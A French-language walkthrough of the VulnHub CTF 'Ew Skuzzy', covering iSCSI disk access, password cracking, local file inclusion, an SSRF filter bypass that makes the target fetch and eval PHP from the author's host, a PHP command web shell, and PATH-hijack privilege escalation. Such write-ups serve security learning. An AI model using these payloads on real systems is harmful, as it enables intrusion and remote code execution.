---
title: "Solution du CTF Ew Skuzzy de VulnHub"
tags: [VulnHub, CTF]
---

Le CTF [Ew_Skuzzy](https://vulnhub.com/entry/ew_skuzzy-1,184/) proposé sur _VulnHub_ et créé par [@vortexau](https://twitter.com/vortexau) était très original et la première partie permettait de se plonger dans des contrées lointaines.

Cette étape permettait d'obtenir des paths sur le serveur web pour la suite du CTF. Il y avait alors plusieurs méthodes pour arriver à ses fins.

Le final est moins intéressant avec une escalade de privilèges très classique.

## Hi Sky!

Le scan Nmap retourne trois ports. J'ai failli ne pas remarquer le dernier port, car Nmap n'a généré qu'une seule ligne à son égard.

```
Nmap scan report for 192.168.56.146
Host is up (0.00060s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:7.2p2: 
|       PACKETSTORM:140070      7.8     https://vulners.com/packetstorm/PACKETSTORM:140070      *EXPLOIT*
|       EXPLOITPACK:5BCA798C6BA71FAE29334297EC0B6A09    7.8     https://vulners.com/exploitpack/EXPLOITPACK:5BCA798C6BA71FAE29334297EC0B6A09    *EXPLOIT*
|       EDB-ID:40888    7.8     https://vulners.com/exploitdb/EDB-ID:40888      *EXPLOIT*
|       CVE-2016-8858   7.8     https://vulners.com/cve/CVE-2016-8858
|       CVE-2016-6515   7.8     https://vulners.com/cve/CVE-2016-6515
|       1337DAY-ID-26494        7.8     https://vulners.com/zdt/1337DAY-ID-26494        *EXPLOIT*
|       SSV:92579       7.5     https://vulners.com/seebug/SSV:92579    *EXPLOIT*
|       CVE-2016-10009  7.5     https://vulners.com/cve/CVE-2016-10009
|       1337DAY-ID-26576        7.5     https://vulners.com/zdt/1337DAY-ID-26576        *EXPLOIT*
|       SSV:92582       7.2     https://vulners.com/seebug/SSV:92582    *EXPLOIT*
|       CVE-2016-10012  7.2     https://vulners.com/cve/CVE-2016-10012
|       CVE-2015-8325   7.2     https://vulners.com/cve/CVE-2015-8325
|       SSV:92580       6.9     https://vulners.com/seebug/SSV:92580    *EXPLOIT*
|       CVE-2016-10010  6.9     https://vulners.com/cve/CVE-2016-10010
|       1337DAY-ID-26577        6.9     https://vulners.com/zdt/1337DAY-ID-26577        *EXPLOIT*
|       EXPLOITPACK:98FE96309F9524B8C84C508837551A19    5.8     https://vulners.com/exploitpack/EXPLOITPACK:98FE96309F9524B8C84C508837551A19    *EXPLOIT*
|       EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97    5.8     https://vulners.com/exploitpack/EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97    *EXPLOIT*
|       EDB-ID:46516    5.8     https://vulners.com/exploitdb/EDB-ID:46516      *EXPLOIT*
|       EDB-ID:46193    5.8     https://vulners.com/exploitdb/EDB-ID:46193      *EXPLOIT*
|       CVE-2019-6111   5.8     https://vulners.com/cve/CVE-2019-6111
|       1337DAY-ID-32328        5.8     https://vulners.com/zdt/1337DAY-ID-32328        *EXPLOIT*
|       1337DAY-ID-32009        5.8     https://vulners.com/zdt/1337DAY-ID-32009        *EXPLOIT*
|       SSV:91041       5.5     https://vulners.com/seebug/SSV:91041    *EXPLOIT*
|       PACKETSTORM:140019      5.5     https://vulners.com/packetstorm/PACKETSTORM:140019      *EXPLOIT*
|       PACKETSTORM:136234      5.5     https://vulners.com/packetstorm/PACKETSTORM:136234      *EXPLOIT*
|       EXPLOITPACK:F92411A645D85F05BDBD274FD222226F    5.5     https://vulners.com/exploitpack/EXPLOITPACK:F92411A645D85F05BDBD274FD222226F    *EXPLOIT*
|       EXPLOITPACK:9F2E746846C3C623A27A441281EAD138    5.5     https://vulners.com/exploitpack/EXPLOITPACK:9F2E746846C3C623A27A441281EAD138    *EXPLOIT*
|       EXPLOITPACK:1902C998CBF9154396911926B4C3B330    5.5     https://vulners.com/exploitpack/EXPLOITPACK:1902C998CBF9154396911926B4C3B330    *EXPLOIT*
|       EDB-ID:40858    5.5     https://vulners.com/exploitdb/EDB-ID:40858      *EXPLOIT*
|       EDB-ID:40119    5.5     https://vulners.com/exploitdb/EDB-ID:40119      *EXPLOIT*
|       CVE-2016-3115   5.5     https://vulners.com/cve/CVE-2016-3115
|       SSH_ENUM        5.0     https://vulners.com/canvas/SSH_ENUM     *EXPLOIT*
|       PACKETSTORM:150621      5.0     https://vulners.com/packetstorm/PACKETSTORM:150621      *EXPLOIT*
|       EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0    5.0     https://vulners.com/exploitpack/EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0    *EXPLOIT*
|       EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283    5.0     https://vulners.com/exploitpack/EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283    *EXPLOIT*
|       EDB-ID:45939    5.0     https://vulners.com/exploitdb/EDB-ID:45939      *EXPLOIT*
|       EDB-ID:45233    5.0     https://vulners.com/exploitdb/EDB-ID:45233      *EXPLOIT*
|       CVE-2018-15919  5.0     https://vulners.com/cve/CVE-2018-15919
|       CVE-2018-15473  5.0     https://vulners.com/cve/CVE-2018-15473
|       CVE-2017-15906  5.0     https://vulners.com/cve/CVE-2017-15906
|       CVE-2016-10708  5.0     https://vulners.com/cve/CVE-2016-10708
|       1337DAY-ID-31730        5.0     https://vulners.com/zdt/1337DAY-ID-31730        *EXPLOIT*
|       CVE-2021-41617  4.4     https://vulners.com/cve/CVE-2021-41617
|       EXPLOITPACK:802AF3229492E147A5F09C7F2B27C6DF    4.3     https://vulners.com/exploitpack/EXPLOITPACK:802AF3229492E147A5F09C7F2B27C6DF    *EXPLOIT*
|       EXPLOITPACK:5652DDAA7FE452E19AC0DC1CD97BA3EF    4.3     https://vulners.com/exploitpack/EXPLOITPACK:5652DDAA7FE452E19AC0DC1CD97BA3EF    *EXPLOIT*
|       EDB-ID:40113    4.3     https://vulners.com/exploitdb/EDB-ID:40113      *EXPLOIT*
|       CVE-2020-14145  4.3     https://vulners.com/cve/CVE-2020-14145
|       CVE-2016-6210   4.3     https://vulners.com/cve/CVE-2016-6210
|       1337DAY-ID-25440        4.3     https://vulners.com/zdt/1337DAY-ID-25440        *EXPLOIT*
|       1337DAY-ID-25438        4.3     https://vulners.com/zdt/1337DAY-ID-25438        *EXPLOIT*
|       CVE-2019-6110   4.0     https://vulners.com/cve/CVE-2019-6110
|       CVE-2019-6109   4.0     https://vulners.com/cve/CVE-2019-6109
|       CVE-2018-20685  2.6     https://vulners.com/cve/CVE-2018-20685
|       SSV:92581       2.1     https://vulners.com/seebug/SSV:92581    *EXPLOIT*
|       CVE-2016-10011  2.1     https://vulners.com/cve/CVE-2016-10011
|       PACKETSTORM:151227      0.0     https://vulners.com/packetstorm/PACKETSTORM:151227      *EXPLOIT*
|       PACKETSTORM:140261      0.0     https://vulners.com/packetstorm/PACKETSTORM:140261      *EXPLOIT*
|       PACKETSTORM:138006      0.0     https://vulners.com/packetstorm/PACKETSTORM:138006      *EXPLOIT*
|       PACKETSTORM:137942      0.0     https://vulners.com/packetstorm/PACKETSTORM:137942      *EXPLOIT*
|       MSF:AUXILIARY-SCANNER-SSH-SSH_ENUMUSERS-        0.0     https://vulners.com/metasploit/MSF:AUXILIARY-SCANNER-SSH-SSH_ENUMUSERS- *EXPLOIT*
|_      1337DAY-ID-30937        0.0     https://vulners.com/zdt/1337DAY-ID-30937        *EXPLOIT*
80/tcp   open  http    nginx
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
| http-vuln-cve2011-3192: 
|   VULNERABLE:
|   Apache byterange filter DoS
|     State: VULNERABLE
|     IDs:  CVE:CVE-2011-3192  BID:49303
|       The Apache web server is vulnerable to a denial of service attack when numerous
|       overlapping byte ranges are requested.
|     Disclosure date: 2011-08-19
|     References:
|       https://www.securityfocus.com/bid/49303
|       https://seclists.org/fulldisclosure/2011/Aug/175
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192
|_      https://www.tenable.com/plugins/nessus/55976
3260/tcp open  iscsi?
```

Pour le port 80 j'ai fait différentes énumérations avant de sortir la wordlist `directory-list-2.3-big.txt` qui a seulement trouvé ce dossier :

```
301        7l       12w      178c http://192.168.56.146/smblogin
```

N'ayant trouvé aucun fichier à l'intérieur, il était alors temps de se pencher sur le port que Nmap considère comme du `iscsi`. Ce protocole ne m'est pas tout à fait inconnu. À ce que j'en sais il permet d'exposer un disque dur dans sa forme brute (comparé à d'autres protocoles qui exposent des partages), ce qui permet de faire des backups complètes du disque ou de la maintenance plus poussée. Évidemment, il serait risqué d'exposer un service pareil sur Internet...

On trouve facilement des tutos pour dialoguer avec ce protocole. Dans tous les cas il semble que l'on ait besoin de faire tourner le service `iscsid` qui écoute sur le port 3260 pour la suite des opérations.

Les opérations suivantes se sont faites sous *openSUSE Tumbleweed*, le nom des binaires peut éventuellement changer sur d'autres distributions.

```console
$ sudo systemctl start iscsid
$ sudo systemctl status iscsid
● iscsid.service - Open-iSCSI
     Loaded: loaded (/usr/lib/systemd/system/iscsid.service; disabled; preset: disabled)
     Active: active (running) since Sat 2023-04-01 10:14:52 CEST; 5s ago
TriggeredBy: ● iscsid.socket
       Docs: man:iscsid(8)
             man:iscsiuio(8)
             man:iscsiadm(8)
   Main PID: 19140 (iscsid)
     Status: "Ready to process requests"
      Tasks: 1 (limit: 4915)
        CPU: 6ms
     CGroup: /system.slice/iscsid.service
             └─19140 /usr/sbin/iscsid -f

avril 01 10:14:52 linux-vyoc systemd[1]: Starting Open-iSCSI...
avril 01 10:14:52 linux-vyoc systemd[1]: Started Open-iSCSI.
$ sudo iscsi_discovery 192.168.56.146
iscsiadm: No active sessions.
Set target iqn.2017-02.local.skuzzy:storage.sys0 to automatic login over tcp to portal 192.168.56.146:3260
Logging out of session [sid: 1, target: iqn.2017-02.local.skuzzy:storage.sys0, portal: 192.168.56.146,3260]
Logout of [sid: 1, target: iqn.2017-02.local.skuzzy:storage.sys0, portal: 192.168.56.146,3260] successful.
discovered 1 targets at 192.168.56.146
```

À l'aide de la commande `iscsi_discovery` j'ai trouvé le nom de *target* de la machine. Nmap a aussi un script `iscsi-info` mais ce dernier n'a pas voulu fonctionner.

Pour la suite, il faut se connecter à la *target*. On peut alors voir une nouvelle entrée parmi les périphériques de type block (ici sous le libellé `sdd`) :

```console
$ sudo iscsiadm -m node -T iqn.2017-02.local.skuzzy:storage.sys0 -l
Logging in to [iface: default, target: iqn.2017-02.local.skuzzy:storage.sys0, portal: 192.168.56.146,3260]
Login to [iface: default, target: iqn.2017-02.local.skuzzy:storage.sys0, portal: 192.168.56.146,3260] successful.
$ lsblk --scsi
NAME HCTL       TYPE VENDOR   MODEL                      REV SERIAL               TRAN
sda  0:0:0:0    disk ATA      Samsung SSD 860 EVO 500GB 2B6Q S3Z2NB0M303041W      sata
sdb  1:0:0:0    disk ATA      OCZ-AGILITY4              1    OCZ-8DY8U684AS11K4SR sata
sdc  4:0:0:0    disk ATA      WDC WD10EARS-00Y5B1       0A80 WD-WCAV5C854606      sata
sdd  6:0:0:0    disk IET      VIRTUAL-DISK              0    lun0                 iscsi
sr0  2:0:0:0    rom  ATAPI    ATAPI iHAS124 C           LL06 3524448_398151500391 sata
```

On se renseigne sur le disque et son formatage. Le monter ne pose aucun problème, car il est formaté en `ext4` :

```console
$ sudo fdisk -l /dev/sdd
Disque /dev/sdd : 1 GiB, 1073741824 octets, 2097152 secteurs
Modèle de disque : VIRTUAL-DISK    
Unités : secteur de 1 × 512 = 512 octets
Taille de secteur (logique / physique) : 512 octets / 512 octets
taille d'E/S (minimale / optimale) : 512 octets / 512 octets
$ sudo file -Ls /dev/sdd
/dev/sdd: Linux rev 1.0 ext4 filesystem data, UUID=e0ca44be-b1ed-403a-84bd-db5558d6bb7e (extents) (large files) (huge files)
$ sudo mount /dev/sdd /mnt/
```

À l'intérieur je trouve le premier flag et une image disque :

```console
# tree -a
.
├── bobsdisk.dsk
├── flag1.txt
└── lost+found

2 directories, 2 files
# cat flag1.txt 
Congratulations! You've discovered the first flag!

flag1{c0abc15976b98a478150c900ebb0c86f0327f4dd}

Let's see how you go with the next one...
# file bobsdisk.dsk
bobsdisk.dsk: Linux rev 1.0 ext2 filesystem data, UUID=faef0c66-b61b-4d80-8c20-5e8da65345d4 (large files)
```

## Always Eat Snacks

À son tour, je peux la monter et trouver deux fichiers :

```console
$ mkdir mount
$ sudo mount -o ro bobsdisk.dsk mount/
$ cd mount/
$ tree -a
.
├── lost+found  [error opening dir]
├── ToAlice.csv.enc
└── ToAlice.eml

2 directories, 2 files
```

Le fichier `eml` contient ce message :

> G'day Alice,  
> 
> You know what really annoys me? How you and I ended up being used, like some kind of guinea pigs, by the RSA crypto wonks as actors in their designs for public key crypto... I don't recall ever being asked if that was ok? I never got even one cent of royalties from them!? RSA have made Millions on our backs, and it's time we took a stand!  
> 
> Starting now, today, immediately, I'm never using asymmetric key encryption again, and it's all symmetric keys from here on out. All my files and documents will be encrypted with that popular symmetric crypto algorithm. Uh. Yeah, I can't pronounce its original name. I don't even know what the letters in its other name stand for - but really - that's not important. A bloke at my local hackerspace says its the beez kneez, ridgy-didge, real-deal, the best there is when it comes to symmetric key crypto, he has heaps of stickers on his laptop so I guess it means he knows, right? Anyway, he said it won some big important competition among crypto geeks in October 2000? Lucky Y2K didn't happen then, I suppose or that would have been one boring party!  
> 
> Anyway this algorithm sounded good to me. I used the updated version that won the competition.  
> 
> You know what happened to me this morning? My kids, the little darlings, had spilled their fancy 256 bit Lego kit all over the damn floor. Sigh. Of course I trod on it making my coffee, the level of pain really does ROCKYOU to the core when it happens! It's hard to stay mad though, I really love Lego, the way those blocks chain togeather really does make them work brilliantly.  
> 
> Anyway, given I'm not not using asymmetric crypto any longer, I destroyed my private key, so the public key you have for me may as well be deleted. I've got some notes for you which might help in your current case, I've encrypted it using my new favourite symmetric key crypto algorithm, it should be on the disk with this note.    
> 
> Give me a shout when you're down this way again, we'll catch up for coffee (once the Lego is removed from my foot) :)  
> 
> Cheers,  
> 
> Bob.  
> 
> PS: Oh, before I forget, the hacker-kid who told me how to use this new algorithm, said it was very important I used the command option -md sha256 when decrypting. Why? Who knows? He said something about living  
> on the bleeding-edge...  
> 
> PPS: flag2{054738a5066ff56e0a4fc9eda6418478d23d3a7f}

Il fait mention du chiffrement qu'il utilise, notamment d'un algo de chiffrement symétrique créé en octobre 2020.

Avec une recherche Google j'ai trouvé ce document qui indique qu'il s'agit d'`AES` : http://eprints.rclis.org/33889/1/comparison%20report%20.pdf

L'autre indication est la mention de `sha256`. Sachant que les extensions `.enc` sont souvent liées à `openssl`, tout devient plus clair quand on tente d'utiliser l'utilitaire `openssl2john` :

```
Usage: openssl2john.py [-c cipher] [-m md] [-p plaintext] [-a ascii_pct] <OpenSSL encrypted files>

cipher: 0 => aes-256-cbc, 1 => aes-128-cbc
md: 0 => md5, 1 => sha1, 2 => sha256
ascii_pct: minimum ascii percent (1-100) on decrypted output (ignored if plaintext present)

OpenSSL 1.1.0e uses aes-256-cbc with sha256
```

Il faut aussi spécifier un pourcentage de caractères ascii que l'on souhaite avoir dans l'output. Sans ça, `JtR` va trouver une pluie de collisions de passwords qui nous donneront du charabia. Je suis parti sur au moins 90% de caractères ascii :

```console
$ python openssl2john.py -c 0 -m 2 -a 90 ToAlice.csv.enc | tee hashes.txt
ToAlice.csv.enc:$openssl$0$2$8$3d306b1aac543c4b$fcea1fd89f178db96e61731dfc9dd6b346ba218b209aa713a734d47f3db8b602$0$256$9813110112d4d99f6ee731492eeef4d7efd259d02cadffb0004c31724c084e78fa6168c4a4f3a8f06bccd9aa48868dcf33ef77b36367821e4ad18aa9a1dd8e80e8a28aa585d90b8c236fe1a50cc8fe59cc0f0c62eba0273a975999566ec78ea9866afa534537d1d36512c83a5febcb9eb56e2c2e7a4ad7dfd55c77845d51691192e857b734be4dda10e5f3d94fd215eaae5f9b44481f28cc05c9646386f5d2b71b73a099564fe03e6b03e9b2f92680e552281dd6e11404acbee3c75c16f6520e7050b993cc6713ba3b1880a4f01dfa7be45155285be236f4758ffced2ce5ca7737ffe200e48818d66a436634d4b4bf4bfcea1fd89f178db96e61731dfc9dd6b3$2$90
```

Le mot de passe est vite cassé :

```console
$ john --wordlist=rockyou.txt hashes.txt
Note: This format may emit false positives, so it will keep trying even after finding a possible candidate.
Using default input encoding: UTF-8
Loaded 1 password hash (openssl-enc, OpenSSL "enc" encryption [32/64])
Warning: poor OpenMP scalability for this hash type, consider --fork=4
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
supercalifragilisticoespialidoso (ToAlice.csv.enc)     
1g 0:00:00:07 DONE (2023-04-01 10:43) 0.1305g/s 1872Kp/s 1872Kc/s 1872KC/s 000..*7¡Vamos!
Session completed.
```

On peut alors déchiffrer le CSV qui contient deux paths pour le serveur web :

```console
$ openssl enc -d -aes256 -in ToAlice.csv.enc -k supercalifragilisticoespialidoso -out alice.csv
*** WARNING : deprecated key derivation used.
Using -iter or -pbkdf2 would be better.
$ cat alice.csv 
Web Path,Reason
5560a1468022758dba5e92ac8f2353c0,Black hoodie. Definitely a hacker site! 
c2444910794e037ebd8aaf257178c90b,Nice clean well prepped site. Nothing of interest here.
flag3{2cce194f49c6e423967b7f72316f48c5caf46e84},The strangest URL I've seen? What is it?
```

Le premier path contient juste une page où du code base64 est présent en commentaire. La version en clair n'apporte rien d'intéressant :

```
George Costanza: [Soup Nazi gives him a look] Medium turkey chili. 
[instantly moves to the cashier] 
Jerry Seinfeld: Medium crab bisque. 
George Costanza: [looks in his bag and notices no bread in it] I didn't get any bread. 
Jerry Seinfeld: Just forget it. Let it go. 
George Costanza: Um, excuse me, I - I think you forgot my bread. 
Soup Nazi: Bread, $2 extra. 
George Costanza: $2? But everyone in front of me got free bread. 
Soup Nazi: You want bread? 
George Costanza: Yes, please. 
Soup Nazi: $3! 
George Costanza: What? 
Soup Nazi: NO FLAG FOR YOU
```

## Bypass #1

Le second path ressemble déjà plus à un vrai site avec un menu pour différentes sections :

```html
<nav>
  <ul>
    <li><a href="?p=welcome">Welcome</a></li>
    <li><a href="?p=flag">Flag</a></li>
    <li><a href="?p=party">Let's Party!</a></li>
    <li><a href="?p=reader">Feed Reader</a></li>
  </ul>
</nav>
```

Comme on peut s'en douter `Wapiti` trouve une faille de directory traversal :

```
[*] Launching module file
---
Unix local file disclosure vulnerability in http://192.168.56.146/c2444910794e037ebd8aaf257178c90b/ via injection in the parameter p
Evil request:
    GET /c2444910794e037ebd8aaf257178c90b/?p=%2Fetc%2Fservices HTTP/1.1
    host: 192.168.56.146
    connection: keep-alive
    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
    accept-language: en-US
    accept-encoding: gzip, deflate, br
    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
---
```

Toutefois, si on tente de charger `/etc/passwd` on se fait remettre à notre place. Pour mieux comprendre ce qu'il se passe je fais charger `index.php` en version encodée grace au schéma `php://` et au filtre base64 de PHP :

```
?p=php://filter/convert.base64-encode/resource=index.php
```

On remarque une simple vérification sur l'existence du fichier auquel le suffixe `.php` a été ajouté :

```php
<?php
define('VIAINDEX', true);

// Parameter is $_GET['p'] for the page.
// Use of nullbytes appear to be mitigated in include() in PHP7. This is a good 
// thing.
// But, fortunately for this CTF challenge, a direct include still works, so.. we'll
// have to hack around this.

$page = $_GET['p'];
if(is_array($page)) {
   die("Yeah? Nah..");
}

// Check the local dir with .php appended
if(file_exists($page . '.php')) {
    $page = $page . '.php';
}

if(strstr($page, 'passwd')) {
    print "Now now.. We paid mega bucks to a big consultancy to mitigate skiddy tricks like that one! :trollface:";
    print "<br /><br /><br /><br />";
    print "<br /><br /><br /><br />";
} elseif(strstr($page, "access.log") || strstr($page, "nginx.log")) {
    print ("Nup, we've blocked that one, but it's mitigated in Nginx now anyway");
} else {
    include($page);
}

?>
```

Le fait qu'on ait le contrôle sur le début du nom de fichier permet d'utiliser des protocoles particuliers, mais `file_exists` ne supporte pas les urls HTTP.

Une astuce est de mettre en place un serveur FTP, par exemple avec `pyftpdlib` :

```bash
python3 -m pyftpdlib -p 7777 -D
```

On peut alors passer un path du type `ftp://mon_ip/fichier.php` pour une inclusion distante, car `file_exists` supporte FTP.

Mais passons au script `reader.php` du site web. Ce dernier prend pour argument un paramètre `url` qui est clairement vulnérable à un SSRF mais seules les URLs vers `127.0.0.1` sont acceptées. Voyons ça de plus près :

```php
<?php
defined ('VIAINDEX') or die('Ooooh! So close..');
?>
<h1>Feed Reader</h1>
<?php
if(isset($_GET['url'])) {
    $url = $_GET['url'];
} else {
    print("<a href=\"?p=reader&url=http://127.0.0.1/c2444910794e037ebd8aaf257178c90b/data.txt\">Load Feed</a>");
}

if(isset($url) && strlen($url) != '') {

    // Setup some variables.
    $secretok = false;
    $keyneeded = true;

    // Localhost as a source doesn't need to use the key.
    if(preg_match("#^http://127.0.0.1#", $url)) {
        $keyneeded = false;
        $secretok = true;
    }

    // Handle the key validation when it's needed.
    if($keyneeded) {
        $key = $_GET['key'];
        if(is_array($key)) {
            die("Array trick is mitigated ;)");
        }
        if(isset($key) && strlen($key) == '47') {
	        $hashedkey = hash('sha256', $key);
            $secret = "5ccd0dbdeefbee078b88a6e52db8c1caa8dd8315f227fe1e6aee6bcb6db63656";

            // If you can use the following code for a timing attack
            // then good luck :) But.. You have the source anyway, right? :) 
	        if(strcmp($hashedkey, $secret) == 0) {
                $secretok = true;
            } else {
                die("Sorry... Authentication failed. Key was invalid.");
	        }

        } else {
            die("Authentication invalid. You might need a key.");
        }
    }

    // Just to make sure the above key check was passed.
    if(!$secretok) {
        die("Something went wrong with the authentication process");
    }

    // Now load the contents of the file we are reading, and parse
    // the super awesomeness of its contents!
    $f = file_get_contents($url);

    $text = preg_split("/##text##/s", $f);

    if(isset($text['1']) && strlen($text['1']) > 0) {
        print($text['1']);
    }

    print "<br /><br />";

    $php = preg_split("/##php##/s", $f);

    if(isset($php['1']) && strlen($php['1']) > 0) { 
        eval($php['1']);
        // "If Eval is the answer, you're asking the wrong question!" - SG
        // It hurts me to write insecure code like this, but it is in the
        // name of education, and FUN, so I'll let it slide this time.
    }
}

```

On comprend que pour permettre l'évaluation de code PHP via l'utilisation des tags customs supportés par le script (entre `###php###`) il faut passer à l'URL uné clé dont le sha256 correspond à `5ccd0dbdeefbee078b88a6e52db8c1caa8dd8315f227fe1e6aee6bcb6db63656`.

La solution officielle est d'utiliser le flag4 présent dans le script `flag.php` dont le hashage donne le résultat attendu.

```php
<?php
// Ok, ok. Here's your flag! 
//
// flag4{4e44db0f1edc3c361dbf54eaf4df40352db91f8b}
// 
// Well done, you're doing great so far!
// Next step. SHELL!
//
// 
// Oh. That flag above? You're gonna need it... 
?>
```

## Noway

`reader.php` mentionne aussi une timing-attack. En théorie, comme `strcmp` s'arrête au premier caractère qui diffère, la fonction mettra plus de temps à s'exécuter si le premier caractère est bon plutôt qu'invalide. Une fois qu'on a trouvé ce caractère, on passe au suivant, etc.

La réussite de cette attaque ici semble hautement improbable : la différence de temps doit être de l'ordre de la nanoseconde alors qu'un script d'attaque aura à faire avec la latence du réseau, la gestion des pools de connexions par la librairie HTTP utilisée, les mécanismes de cache du serveur, du système d'exploitation et du client, etc.

J'ai quand même tenté ma chance sans vraiment d'espoir :

```python
#!/usr/bin/env python
import string
import json
from time import monotonic

import requests

url = 'http://192.168.56.146/c2444910794e037ebd8aaf257178c90b/?p=reader&url=http://192.168.56.1:7777/&key='
key_length = 43
sample_size = 10000

sess = requests.session()

def send_request(key):
    global sess
    sess.get(url + key)

def main():
    for char in string.ascii_letters:
        send_request(char*43)

    prefix = ""
    for i in range(43):
        longest_time = 0
        best_char = "?"
        for char in '1bc4f659a02l3deg8{}':
            time_diffs = []
            for __ in range(sample_size):
                candidate = (prefix + char).ljust(43, "a") 
                start = monotonic()
                send_request(candidate)
                end = monotonic()
                time_diffs.append(end - start)

            average = sum(time_diffs) / len(time_diffs)
            if average > longest_time:
                longest_time = average
                best_char = char

        prefix += best_char
        print(prefix)

main()
```

Et effectivement même avec un échantillon de 10000 requêtes par caractère (pour gommer les aléas de la latence) et en se limitant à l'alphabet du flag, le script donne des résultats complétement aléatoires.

## Bypass #2

Ce qui est plus intéressant, c'est la vérification sur l'hôte de l'URL qui se fait sans slash terminal : `^http://127.0.0.1`.

On peut donc passer une URL valide qui ne nécessitera pas de passer le flag, par exemple en utilisant le caractère `@` destiné à l'authentification HTTP basic :

```
?p=reader&url=http://127.0.0.1@192.168.56.1:7777/
```

Une autre solution serait d'enregistrer un domaine du type `1domaine` et de créer les sous domaines nécessaires pour avoir une URL `http://127.0.0.1domaine`.

J'ai choisi d'utiliser la solution avec le `@` et de procéder à une inclusion distante pour le contenu suivant :

```html
<pre>
###php###
system($_GET["cmd"]);
###php###
</pre>
```

J'obtiens alors mon exécution de commande :

```console
www-data@skuzzy:/var/www/html$ id skuzzy
uid=1000(skuzzy) gid=1000(skuzzy) groups=1000(skuzzy),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
```

## Bypath

L'escalade de privilèges est très classique : on trouve un binaire setuid root.

```console
www-data@skuzzy:/var/www/html$ find / -type f -perm -u+s 2> /dev/null 
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/newuidmap
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/at
/usr/bin/newgidmap
/usr/bin/passwd
/usr/bin/sudo
/bin/fusermount
/bin/mount
/bin/su
/bin/ntfs-3g
/bin/ping
/bin/ping6
/bin/umount
/opt/alicebackup
```

Ce dernier appelle des commandes sans path absolu :

```console
www-data@skuzzy:/var/www/html$ /opt/alicebackup
uid=0(root) gid=0(root) groups=0(root),33(www-data)
ssh: Could not resolve hostname alice.home: Temporary failure in name resolution
lost connection
```

On modifie le PATH et on place un binaire du même nom qu'une des commandes appelées dans le dossier courant :

```console
www-data@skuzzy:/tmp$ cp /bin/dash id
www-data@skuzzy:/tmp$ export PATH=.:$PATH
www-data@skuzzy:/tmp$ /opt/alicebackup
# cd /root
# lss
flag.txt
# cat flag.txt
Congratulations!

flag5{42273509a79da5bf49f9d40a10c512dd96d89f6a}

You've found the final flag and pwned this CTF VM!

I really hope this was an enjoyable challenge, and that my trolling and messing with you didn't upset you too much! I had a blast making this VM, so it won't be my last!

I'd love to hear your thoughts on this one.
Too easy?
Too hard?
Too much stuff to install to get the iSCSI initiator working?

Drop me a line on twitter @vortexau, or via email vortex@juicedigital.net
```
